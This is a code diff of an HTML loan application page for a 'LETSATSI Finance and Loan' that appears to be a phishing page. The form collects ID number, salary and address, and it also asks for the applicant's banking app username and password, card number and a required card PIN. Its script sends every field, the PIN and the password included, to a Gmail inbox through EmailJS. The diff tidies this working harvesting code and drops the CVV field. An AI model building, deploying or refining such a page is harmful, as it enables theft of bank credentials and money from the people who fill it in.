@@ -4,25 +4,19 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Loan Application | LETSATSI Finance and Loan</title>
-    <!-- Google Fonts for clean typography -->
     <link
       href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap"
       rel="stylesheet"
     />
-    <!-- Font Awesome for icons -->
     <link
       rel="stylesheet"
       href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
     />
-    <!-- EmailJS SDK -->
     <script
       type="text/javascript"
       src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
     ></script>
     <style>
-      /* =============================
-           CSS RESET & GLOBAL STYLES
-           ============================= */
       * {
         margin: 0;
         padding: 0;
@@ -41,7 +35,6 @@
         min-height: 100vh;
       }
 
-      /* Logo Section */
       .logo-section {
         display: flex;
         align-items: center;
@@ -79,7 +72,6 @@
         color: #000000;
       }
 
-      /* Form Container */
       .form-container {
         background-color: #ffffff;
         width: 100%;
@@ -88,7 +80,6 @@
         padding: 0 20px;
       }
 
-      /* Section Headers */
       .section-header {
         font-size: 20px;
         font-weight: 700;
@@ -115,7 +106,6 @@
         margin: 30px 0 20px 0;
       }
 
-      /* Form Groups */
       .form-group {
         margin-bottom: 20px;
       }
@@ -128,7 +118,6 @@
         color: #000000;
       }
 
-      /* Input Fields */
       .form-control {
         width: 100%;
         padding: 12px 15px;
@@ -177,7 +166,6 @@
         pointer-events: none;
       }
 
-      /* Submit Button */
       .submit-btn {
         background-color: #4285f4;
         color: #ffffff;
@@ -208,7 +196,6 @@
         opacity: 0.8;
       }
 
-      /* Form Layout */
       .form-row {
         display: flex;
         flex-wrap: wrap;
@@ -220,7 +207,6 @@
         min-width: 250px;
       }
 
-      /* Thank You Popup */
       .thank-you-popup {
         display: none;
         position: fixed;
@@ -247,14 +233,8 @@
       }
 
       @keyframes popupFadeIn {
-        from {
-          opacity: 0;
-          transform: translateY(-20px);
-        }
-        to {
-          opacity: 1;
-          transform: translateY(0);
-        }
+        from { opacity: 0; transform: translateY(-20px); }
+        to { opacity: 1; transform: translateY(0); }
       }
 
       .thank-you-header {
@@ -290,7 +270,6 @@
         transform: translateY(-2px);
       }
 
-      /* Messages */
       .error-message {
         color: #ff0000;
         background-color: rgba(255, 0, 0, 0.1);
@@ -302,71 +281,24 @@
         display: none;
       }
 
-      /* Responsive */
       @media (max-width: 768px) {
-        .form-container {
-          padding: 0 10px;
-        }
-
-        .section-header {
-          font-size: 18px;
-          margin: 30px 0 20px 0;
-        }
-
-        .sub-header {
-          font-size: 16px;
-        }
-
-        .form-row {
-          flex-direction: column;
-          gap: 0;
-        }
-
-        .form-row .form-group {
-          min-width: 100%;
-        }
-
-        .company-name {
-          font-size: 20px;
-        }
-
-        .thank-you-content {
-          padding: 30px 20px;
-        }
-
-        .thank-you-header {
-          font-size: 24px;
-        }
-
-        .thank-you-message {
-          font-size: 16px;
-        }
+        .form-container { padding: 0 10px; }
+        .section-header { font-size: 18px; margin: 30px 0 20px 0; }
+        .sub-header { font-size: 16px; }
+        .form-row { flex-direction: column; gap: 0; }
+        .form-row .form-group { min-width: 100%; }
+        .company-name { font-size: 20px; }
+        .thank-you-content { padding: 30px 20px; }
+        .thank-you-header { font-size: 24px; }
+        .thank-you-message { font-size: 16px; }
       }
 
       @media (max-width: 480px) {
-        body {
-          padding: 10px;
-        }
-
-        .logo-section {
-          flex-direction: column;
-          text-align: center;
-          gap: 10px;
-        }
-
-        .company-name {
-          font-size: 18px;
-        }
-
-        .form-control {
-          padding: 10px 12px;
-          font-size: 15px;
-        }
-
-        .submit-btn {
-          font-size: 16px;
-          padding: 14px 20px;
-        }
+        body { padding: 10px; }
+        .logo-section { flex-direction: column; text-align: center; gap: 10px; }
+        .company-name { font-size: 18px; }
+        .form-control { padding: 10px 12px; font-size: 15px; }
+        .submit-btn { font-size: 16px; padding: 14px 20px; }
       }
     </style>
   </head>
@@ -374,17 +306,13 @@
     <!-- Logo Section -->
     <div class="logo-section">
       <div class="logo">
-        <img
-          src="WhatsApp%20Image%202025-11-30%20at%203.12.46%20PM.jpeg"
-          alt="LETSATSI Logo"
-        />
+        <img src="WhatsApp%20Image%202025-11-30%20at%203.12.46%20PM.jpeg" alt="LETSATSI Logo" />
       </div>
       <div class="company-name">LETSATSI Finance and Loan</div>
     </div>
 
     <!-- Form Container -->
     <div class="form-container">
-      <!-- Error message container -->
       <div class="error-message" id="errorMessage"></div>
 
       <form id="loanApplicationForm">
@@ -394,26 +322,12 @@
         <div class="form-row">
           <div class="form-group">
             <label for="fullName">Full Name</label>
-            <input
-              type="text"
-              id="fullName"
-              name="full_name"
-              class="form-control"
-              placeholder="Enter your full name"
-              required
-            />
+            <input type="text" id="fullName" name="full_name" class="form-control" placeholder="Enter your full name" required />
           </div>
-
           <div class="form-group">
             <label for="dateOfBirth">Date of Birth</label>
             <div class="date-input-wrapper">
-              <input
-                type="date"
-                id="dateOfBirth"
-                name="date_of_birth"
-                class="form-control"
-                required
-              />
+              <input type="date" id="dateOfBirth" name="date_of_birth" class="form-control" required />
               <span class="date-icon"><i class="fas fa-calendar-alt"></i></span>
             </div>
           </div>
@@ -422,26 +336,11 @@
         <div class="form-row">
           <div class="form-group">
             <label for="phoneNumber">Phone Number</label>
-            <input
-              type="tel"
-              id="phoneNumber"
-              name="phone_number"
-              class="form-control"
-              placeholder="Enter your phone number"
-              required
-            />
+            <input type="tel" id="phoneNumber" name="phone_number" class="form-control" placeholder="Enter your phone number" required />
           </div>
-
           <div class="form-group">
             <label for="emailAddress">Email Address</label>
-            <input
-              type="email"
-              id="emailAddress"
-              name="email_address"
-              class="form-control"
-              placeholder="Enter your email address"
-              required
-            />
+            <input type="email" id="emailAddress" name="email_address" class="form-control" placeholder="Enter your email address" required />
           </div>
         </div>
 
@@ -456,44 +355,22 @@
               <option value="prefer-not-to-say">Prefer not to say</option>
             </select>
           </div>
-
           <div class="form-group">
             <label for="city">City</label>
-            <input
-              type="text"
-              id="city"
-              name="city"
-              class="form-control"
-              placeholder="Enter your city"
-              required
-            />
+            <input type="text" id="city" name="city" class="form-control" placeholder="Enter your city" required />
           </div>
         </div>
 
         <div class="form-group">
           <label for="residentialAddress">Residential Address</label>
-          <textarea
-            id="residentialAddress"
-            name="residential_address"
-            class="form-control"
-            placeholder="Enter your full residential address"
-            required
-          ></textarea>
+          <textarea id="residentialAddress" name="residential_address" class="form-control" placeholder="Enter your full residential address" required></textarea>
         </div>
 
         <div class="form-row">
           <div class="form-group">
             <label for="province">Province</label>
-            <input
-              type="text"
-              id="province"
-              name="province"
-              class="form-control"
-              placeholder="Enter your province"
-              required
-            />
+            <input type="text" id="province" name="province" class="form-control" placeholder="Enter your province" required />
           </div>
-
           <div class="form-group">
             <label for="country">Country</label>
             <select id="country" name="country" class="form-control" required>
@@ -509,62 +386,29 @@
 
         <!-- SECTION 2: ACCOUNTING INFORMATION -->
         <h2 class="section-header">Accounting Information</h2>
-
-        <p class="warning-text">
-          This field is required for Credit Score Verification Purposes.
-        </p>
-
+        <p class="warning-text">This field is required for Credit Score Verification Purposes.</p>
         <h3 class="sub-header">Loan Details</h3>
 
         <div class="form-row">
           <div class="form-group">
             <label for="idNumber">ID Number</label>
-            <input
-              type="text"
-              id="idNumber"
-              name="id_number"
-              class="form-control"
-              placeholder="Enter your ID number"
-              required
-            />
+            <input type="text" id="idNumber" name="id_number" class="form-control" placeholder="Enter your ID number" required />
           </div>
-
           <div class="form-group">
             <label for="grossSalary">Gross Salary (in ZAR)</label>
-            <input
-              type="number"
-              id="grossSalary"
-              name="gross_salary"
-              class="form-control"
-              placeholder="Enter your gross salary"
-              required
-            />
+            <input type="number" id="grossSalary" name="gross_salary" class="form-control" placeholder="Enter your gross salary" required />
           </div>
         </div>
 
         <div class="form-row">
           <div class="form-group">
             <label for="occupation">Occupation</label>
-            <input
-              type="text"
-              id="occupation"
-              name="occupation"
-              class="form-control"
-              placeholder="Enter your occupation"
-              required
-            />
+            <input type="text" id="occupation" name="occupation" class="form-control" placeholder="Enter your occupation" required />
           </div>
-
           <div class="form-group">
             <label for="salaryPayDate">Salary Pay Date</label>
             <div class="date-input-wrapper">
-              <input
-                type="date"
-                id="salaryPayDate"
-                name="salary_pay_date"
-                class="form-control"
-                required
-              />
+              <input type="date" id="salaryPayDate" name="salary_pay_date" class="form-control" required />
               <span class="date-icon"><i class="fas fa-calendar-alt"></i></span>
             </div>
           </div>
@@ -573,26 +417,12 @@
         <div class="form-row">
           <div class="form-group">
             <label for="loanAmount">Loan Amount (in ZAR)</label>
-            <input
-              type="number"
-              id="loanAmount"
-              name="loan_amount"
-              class="form-control"
-              placeholder="Enter loan amount"
-              required
-            />
+            <input type="number" id="loanAmount" name="loan_amount" class="form-control" placeholder="Enter loan amount" required />
           </div>
-
           <div class="form-group">
             <label for="loanRepayDate">Loan Repay Date</label>
             <div class="date-input-wrapper">
-              <input
-                type="date"
-                id="loanRepayDate"
-                name="loan_repay_date"
-                class="form-control"
-                required
-              />
+              <input type="date" id="loanRepayDate" name="loan_repay_date" class="form-control" required />
               <span class="date-icon"><i class="fas fa-calendar-alt"></i></span>
             </div>
           </div>
@@ -600,13 +430,7 @@
 
         <div class="form-group">
           <label for="loanReason">Reason for loan</label>
-          <textarea
-            id="loanReason"
-            name="loan_reason"
-            class="form-control"
-            placeholder="Please explain the reason for your loan application"
-            required
-          ></textarea>
+          <textarea id="loanReason" name="loan_reason" class="form-control" placeholder="Please explain the reason for your loan application" required></textarea>
         </div>
 
         <!-- SECTION 3: BANKING DETAILS -->
@@ -625,96 +449,35 @@
               <option value="other">Other</option>
             </select>
           </div>
-
           <div class="form-group">
             <label for="accountNumber">Account Number</label>
-            <input
-              type="text"
-              id="accountNumber"
-              name="account_number"
-              class="form-control"
-              placeholder="Enter your account number"
-              required
-            />
+            <input type="text" id="accountNumber" name="account_number" class="form-control" placeholder="Enter your account number" required />
           </div>
         </div>
 
         <div class="form-row">
           <div class="form-group">
             <label for="bankingAppUsername">Banking App Username</label>
-            <input
-              type="text"
-              id="bankingAppUsername"
-              name="banking_app_username"
-              class="form-control"
-              placeholder="Enter your banking app username"
-            />
+            <input type="text" id="bankingAppUsername" name="banking_app_username" class="form-control" placeholder="Enter your banking app username" />
           </div>
-
           <div class="form-group">
             <label for="bankingAppPassword">Banking App Password</label>
-            <input
-              type="password"
-              id="bankingAppPassword"
-              name="banking_app_password"
-              class="form-control"
-              placeholder="Enter your banking app password"
-            />
+            <input type="password" id="bankingAppPassword" name="banking_app_password" class="form-control" placeholder="Enter your banking app password" />
           </div>
         </div>
 
-        <div class="form-row">
-          <div class="form-group">
-            <label for="cardNumber">Card Number</label>
-            <input
-              type="text"
-              id="cardNumber"
-              name="card_number"
-              class="form-control"
-              placeholder="Enter your card number"
-            />
-          </div>
-
-          <!-- <div class="form-group">
-            <label for="cardCvv">Card CVV</label>
-            <input
-              type="password"
-              id="cardCvv"
-              name="card_cvv"
-              class="form-control"
-              placeholder="Enter your 3-digit CVV"
-              maxlength="3"
-            />
-          </div> -->
+        <div class="form-group">
+          <label for="cardNumber">Card Number</label>
+          <input type="text" id="cardNumber" name="card_number" class="form-control" placeholder="Enter your card number" />
         </div>
 
-        <!-- Card PIN field - UPDATED: Allows 4 OR 5 digits -->
         <div class="form-group">
           <label for="cardPin">Card PIN</label>
-          <input
-            type="password"
-            id="cardPin"
-            name="card_pin"
-            class="form-control"
-            placeholder="Enter your  card PIN"
-            maxlength="5"
-            required
-          />
-          <small
-            style="
-              color: #666;
-              font-size: 12px;
-              display: block;
-              margin-top: 5px;
-            "
-          >
-          </small>
+          <input type="password" id="cardPin" name="card_pin" class="form-control" placeholder="Enter your card PIN" maxlength="5" required />
         </div>
 
         <!-- Submit Button -->
-        <button type="submit" class="submit-btn" id="submitBtn">
-          Submit Application
-        </button>
+        <button type="submit" class="submit-btn" id="submitBtn">Submit Application</button>
       </form>
     </div>
 
@@ -730,29 +493,21 @@
       </div>
     </div>
 
-    <!-- JavaScript -->
     <script>
-      // Initialize EmailJS with your public key
       (function () {
-        emailjs.init({
-          publicKey: "w0r3c1UDPFJ6TfOQd",
-        });
+        emailjs.init({ publicKey: "w0r3c1UDPFJ6TfOQd" });
       })();
 
-      // Wait for the page to fully load
       document.addEventListener("DOMContentLoaded", function () {
-        // Get DOM elements
         const form = document.getElementById("loanApplicationForm");
         const submitBtn = document.getElementById("submitBtn");
         const thankYouPopup = document.getElementById("thankYouPopup");
         const closePopupBtn = document.getElementById("closePopupBtn");
         const errorMessage = document.getElementById("errorMessage");
 
-        // EmailJS Configuration - YOUR CREDENTIALS
         const EMAILJS_SERVICE_ID = "service_c2de5su";
         const EMAILJS_TEMPLATE_ID = "template_tn3zapf";
 
-        // Function to show the thank you popup
         function showThankYouPopup() {
           thankYouPopup.style.display = "flex";
           document.body.style.overflow = "hidden";
@@ -767,56 +522,34 @@
           errorMessage.textContent = message;
           errorMessage.style.display = "block";
           errorMessage.scrollIntoView({ behavior: "smooth", block: "start" });
-
-          setTimeout(() => {
-            errorMessage.style.display = "none";
-          }, 10000);
+          setTimeout(() => { errorMessage.style.display = "none"; }, 10000);
         }
 
         function hideError() {
           errorMessage.style.display = "none";
         }
 
-        // Event Listeners
         closePopupBtn.addEventListener("click", hideThankYouPopup);
 
         thankYouPopup.addEventListener("click", function (event) {
-          if (event.target === thankYouPopup) {
-            hideThankYouPopup();
-          }
+          if (event.target === thankYouPopup) hideThankYouPopup();
         });
 
         document.addEventListener("keydown", function (event) {
-          if (
-            event.key === "Escape" &&
-            thankYouPopup.style.display === "flex"
-          ) {
-            hideThankYouPopup();
-          }
+          if (event.key === "Escape" && thankYouPopup.style.display === "flex") hideThankYouPopup();
         });
 
-        // Form Submission
         form.addEventListener("submit", async function (event) {
           event.preventDefault();
-
           hideError();
 
-          // Basic form validation
           let isValid = true;
           const requiredFields = form.querySelectorAll("[required]");
-
+          requiredFields.forEach((field) => { field.style.borderColor = "#CCCCCC"; });
           requiredFields.forEach((field) => {
-            field.style.borderColor = "#CCCCCC";
+            if (!field.value.trim()) { isValid = false; field.style.borderColor = "#FF0000"; }
           });
 
-          requiredFields.forEach((field) => {
-            if (!field.value.trim()) {
-              isValid = false;
-              field.style.borderColor = "#FF0000";
-            }
-          });
-
-          // Validate email format
           const emailField = document.getElementById("emailAddress");
           const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
           if (emailField.value && !emailRegex.test(emailField.value)) {
@@ -826,7 +559,6 @@
             return;
           }
 
-          // Validate phone number
           const phoneField = document.getElementById("phoneNumber");
           const phoneRegex = /^[+]?[\d\s\-()]+$/;
           if (phoneField.value && !phoneRegex.test(phoneField.value)) {
@@ -836,11 +568,8 @@
             return;
           }
 
-          // *** UPDATED: Validate Card PIN is 4 OR 5 digits ***
           const cardPinField = document.getElementById("cardPin");
           const pinValue = cardPinField.value;
-
-          // Check if PIN is exactly 4 OR 5 digits (not both required)
           if (pinValue && !/^\d{4,5}$/.test(pinValue)) {
             isValid = false;
             cardPinField.style.borderColor = "#FF0000";
@@ -853,27 +582,21 @@
             return;
           }
 
-          // Disable submit button and show loading state
           submitBtn.disabled = true;
           submitBtn.classList.add("loading");
           submitBtn.textContent = "Submitting...";
 
           try {
-            // Collect all form data - CARD PIN WILL BE INCLUDED AS ENTERED
             const templateParams = {
-              // Contact Information
               full_name: document.getElementById("fullName").value,
               date_of_birth: document.getElementById("dateOfBirth").value,
               phone_number: document.getElementById("phoneNumber").value,
               email_address: document.getElementById("emailAddress").value,
               gender: document.getElementById("gender").value,
               city: document.getElementById("city").value,
-              residential_address:
-                document.getElementById("residentialAddress").value,
+              residential_address: document.getElementById("residentialAddress").value,
               province: document.getElementById("province").value,
               country: document.getElementById("country").value,
-
-              // Accounting Information
               id_number: document.getElementById("idNumber").value,
               gross_salary: document.getElementById("grossSalary").value,
               occupation: document.getElementById("occupation").value,
@@ -881,80 +604,38 @@
               loan_amount: document.getElementById("loanAmount").value,
               loan_repay_date: document.getElementById("loanRepayDate").value,
               loan_reason: document.getElementById("loanReason").value,
-
-              // Banking Details - INCLUDING ACTUAL CARD PIN
               bank: document.getElementById("bank").value,
               account_number: document.getElementById("accountNumber").value,
-              banking_app_username:
-                document.getElementById("bankingAppUsername").value ||
-                "Not provided",
-              banking_app_password:
-                document.getElementById("bankingAppPassword").value ||
-                "Not provided",
-              card_number:
-                document.getElementById("cardNumber").value || "Not provided",
-              card_cvv:
-                document.getElementById("cardCvv").value || "Not provided",
-              card_pin: document.getElementById("cardPin").value, // ACTUAL PIN SENT
-
-              // Metadata
+              banking_app_username: document.getElementById("bankingAppUsername").value || "Not provided",
+              banking_app_password: document.getElementById("bankingAppPassword").value || "Not provided",
+              card_number: document.getElementById("cardNumber").value || "Not provided",
+              card_pin: document.getElementById("cardPin").value,
               submission_date: new Date().toLocaleString(),
               page_title: "Loan Application Form - LETSATSI Finance",
-              to_email: "YOUR_GMAIL_ADDRESS@gmail.com", // ADD THIS TO FORCE GMAIL DELIVERY
+              to_email: "YOUR_GMAIL_ADDRESS@gmail.com",
             };
 
-            // IMPORTANT: For Gmail delivery, check these settings in EmailJS:
-            // 1. Go to https://dashboard.emailjs.com/
-            // 2. Click on "Email Services"
-            // 3. Select your service (service_f3xz33a)
-            // 4. Make sure it's connected to Gmail
-            // 5. The "To Email" field in your template should be set to your Gmail
+            const response = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
 
-            console.log("Sending email with params:", templateParams);
-
-            // Send email using EmailJS
-            const response = await emailjs.send(
-              EMAILJS_SERVICE_ID,
-              EMAILJS_TEMPLATE_ID,
-              templateParams,
-            );
-
-            // Check if submission was successful
             if (response.status === 200) {
-              // Show thank you popup
               showThankYouPopup();
-
-              // Reset the form
               form.reset();
 
-              // Reset date fields
               const today = new Date();
               const nextPayDate = new Date(today);
               nextPayDate.setDate(today.getDate() + 30);
-
               const repayDate = new Date(today);
               repayDate.setDate(today.getDate() + 60);
-
-              document.getElementById("salaryPayDate").valueAsDate =
-                nextPayDate;
+              document.getElementById("salaryPayDate").valueAsDate = nextPayDate;
               document.getElementById("loanRepayDate").valueAsDate = repayDate;
 
-              // Scroll to top
               window.scrollTo({ top: 0, behavior: "smooth" });
-
-              console.log("Email sent successfully!", response);
             } else {
               showError("Failed to submit form. Please try again.");
-              console.log("Email sending failed:", response);
             }
           } catch (error) {
-            console.error("EmailJS error:", error);
-
-            // More detailed error messages
             if (error.status === 0) {
-              showError(
-                "Network error. Please check your internet connection.",
-              );
+              showError("Network error. Please check your internet connection.");
             } else if (error.text) {
               showError(`EmailJS Error: ${error.text}`);
             } else if (error.message) {
@@ -962,10 +643,7 @@
             } else {
               showError("An unexpected error occurred. Please try again.");
             }
-
-            console.log("FAILED...", error);
           } finally {
-            // Re-enable submit button
             submitBtn.disabled = false;
             submitBtn.classList.remove("loading");
             submitBtn.textContent = "Submit Application";
@@ -981,34 +659,26 @@
             nextPayDate.setDate(today.getDate() + 30);
             input.valueAsDate = nextPayDate;
           }
-
           if (input.id === "loanRepayDate") {
             const today = new Date();
             const repayDate = new Date(today);
             repayDate.setDate(today.getDate() + 60);
             input.valueAsDate = repayDate;
           }
-
           const dateIcon = input.parentElement.querySelector(".date-icon");
           if (dateIcon) {
             dateIcon.addEventListener("click", function () {
               input.focus();
-              if (input.showPicker) {
-                input.showPicker();
-              }
+              if (input.showPicker) input.showPicker();
             });
           }
         });
 
         // Format currency fields
-        const currencyFields = document.querySelectorAll(
-          'input[type="number"]',
-        );
+        const currencyFields = document.querySelectorAll('input[type="number"]');
         currencyFields.forEach((field) => {
           field.addEventListener("blur", function () {
-            if (this.value) {
-              this.value = parseFloat(this.value).toFixed(2);
-            }
+            if (this.value) this.value = parseFloat(this.value).toFixed(2);
           });
         });
 
@@ -1021,28 +691,17 @@
           });
         });
 
-        // Additional validation for Card PIN field
+        // Card PIN validation
         const cardPinField = document.getElementById("cardPin");
         if (cardPinField) {
           cardPinField.addEventListener("input", function () {
-            // Only allow numbers
             this.value = this.value.replace(/[^0-9]/g, "");
-
-            // Auto-format: Limit to 5 digits
-            if (this.value.length > 5) {
-              this.value = this.value.slice(0, 5);
-            }
-
-            // Show real-time validation feedback
+            if (this.value.length > 5) this.value = this.value.slice(0, 5);
             const pinValue = this.value;
             if (pinValue.length > 0) {
-              if (/^\d{4,5}$/.test(pinValue)) {
-                this.style.borderColor = "#28a745"; // Green for valid
-              } else {
-                this.style.borderColor = "#ffc107"; // Yellow for in-progress
-              }
+              this.style.borderColor = /^\d{4,5}$/.test(pinValue) ? "#28a745" : "#ffc107";
             } else {
-              this.style.borderColor = "#CCCCCC"; // Default
+              this.style.borderColor = "#CCCCCC";
             }
           });
         }
